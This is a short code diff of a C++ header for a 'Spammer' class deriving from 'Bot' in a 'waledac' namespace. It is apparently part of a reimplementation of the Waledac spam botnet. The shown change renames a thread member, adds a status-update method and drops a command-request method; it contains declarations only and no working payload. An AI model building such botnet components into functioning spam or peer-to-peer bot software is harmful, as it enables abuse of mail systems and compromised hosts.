@@ -28,13 +28,13 @@ namespace waledac {
 class Spammer : public Bot
 {
 private:
-	boost::shared_ptr< boost::thread > m_spammer_thread;
+	boost::shared_ptr< boost::thread > m_thread;
 	
-	
+	void update_status(response_code code);
+
 public:
 	Spammer();
 	void update_rlist();
-	void request_command();
 	
 	std::vector< boost::shared_ptr<Bot> > rlist();
 	
